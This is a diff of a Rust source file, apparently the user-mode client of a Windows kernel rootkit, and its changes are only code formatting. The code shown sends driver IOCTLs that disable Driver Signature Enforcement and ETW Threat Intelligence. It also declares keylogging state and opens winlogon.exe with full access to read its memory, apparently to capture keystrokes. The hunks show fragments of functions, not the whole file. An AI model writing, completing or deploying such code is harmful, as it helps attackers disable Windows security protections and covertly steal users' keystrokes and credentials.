@@ -8,23 +8,16 @@ use std::{
 };
 
 use windows_sys::Win32::{
-    Foundation::{
-        CloseHandle, GetLastError, 
-        HANDLE, INVALID_HANDLE_VALUE
-    },
+    Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE},
     System::{
         Diagnostics::Debug::ReadProcessMemory,
-        Threading::{OpenProcess, PROCESS_ALL_ACCESS},
         IO::DeviceIoControl,
+        Threading::{OpenProcess, PROCESS_ALL_ACCESS},
     },
 };
 
+use crate::utils::{get_process_by_name, key_pressed, open_driver, update_key_state, vk_to_char};
 use common::structs::{DSE, ETWTI};
-use crate::utils::{
-    get_process_by_name, 
-    key_pressed, open_driver, 
-    update_key_state, vk_to_char
-};
 
 /// Key states for keylogging functionality.
 pub static mut KEY_STATE: [u8; 64] = [0; 64];
@@ -59,10 +52,16 @@ impl Misc {
     /// * `ioctl_code` - The IOCTL code for the DSE operation.
     /// * `enable` - `true` to enable DSE or `false` to disable it.
     pub fn dse(self, ioctl_code: u32, enable: bool) {
-        log::debug!("Preparing DSE structure for {}", if enable { "enabling" } else { "disabling" });
+        log::debug!(
+            "Preparing DSE structure for {}",
+            if enable { "enabling" } else { "disabling" }
+        );
         let mut info_dse = DSE { enable };
 
-        log::debug!("Sending DeviceIoControl command to {} DSE", if enable { "enable" } else { "disable" });
+        log::debug!(
+            "Sending DeviceIoControl command to {} DSE",
+            if enable { "enable" } else { "disable" }
+        );
         let mut return_buffer = 0;
         let status = unsafe {
             DeviceIoControl(
@@ -78,9 +77,14 @@ impl Misc {
         };
 
         if status == 0 {
-            log::error!("DeviceIoControl failed with status: 0x{:08X}", unsafe { GetLastError() });
+            log::error!("DeviceIoControl failed with status: 0x{:08X}", unsafe {
+                GetLastError()
+            });
         } else {
-            log::info!("Driver Signature Enforcement (DSE) {}", if enable { "enable" } else { "disable" });
+            log::info!(
+                "Driver Signature Enforcement (DSE) {}",
+                if enable { "enable" } else { "disable" }
+            );
         }
     }
 
@@ -106,11 +110,15 @@ impl Misc {
             );
 
             if status == 0 {
-                log::error!("DeviceIoControl Failed With Status: 0x{:08X}", GetLastError());
+                log::error!(
+                    "DeviceIoControl Failed With Status: 0x{:08X}",
+                    GetLastError()
+                );
                 return;
             }
 
-            let pid = get_process_by_name("winlogon.exe").expect("Error retrieving pid from winlogon.exe");
+            let pid = get_process_by_name("winlogon.exe")
+                .expect("Error retrieving pid from winlogon.exe");
             let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
             if h_process == INVALID_HANDLE_VALUE {
                 eprintln!("OpenProcess Failed With Error: {}", GetLastError());
@@ -162,10 +170,16 @@ impl Misc {
     /// * `ioctl_code` - The IOCTL code for the ETWTI operation.
     /// * `enable` - `true` to enable ETWTI or `false` to disable it.
     pub fn etwti(self, ioctl_code: u32, enable: bool) {
-        log::debug!("Preparing ETWTI structure for {}", if enable { "enabling" } else { "disabling" });
+        log::debug!(
+            "Preparing ETWTI structure for {}",
+            if enable { "enabling" } else { "disabling" }
+        );
         let mut etwti = ETWTI { enable };
 
-        log::debug!("Sending DeviceIoControl command to {} ETWTI", if enable { "enable" } else { "disable" });
+        log::debug!(
+            "Sending DeviceIoControl command to {} ETWTI",
+            if enable { "enable" } else { "disable" }
+        );
         let mut return_buffer = 0;
         let status = unsafe {
             DeviceIoControl(
@@ -181,7 +195,9 @@ impl Misc {
         };
 
         if status == 0 {
-            log::error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
+            log::error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe {
+                GetLastError()
+            });
         } else {
             log::info!("ETWTI {}", if enable { "enable" } else { "disable" })
         }
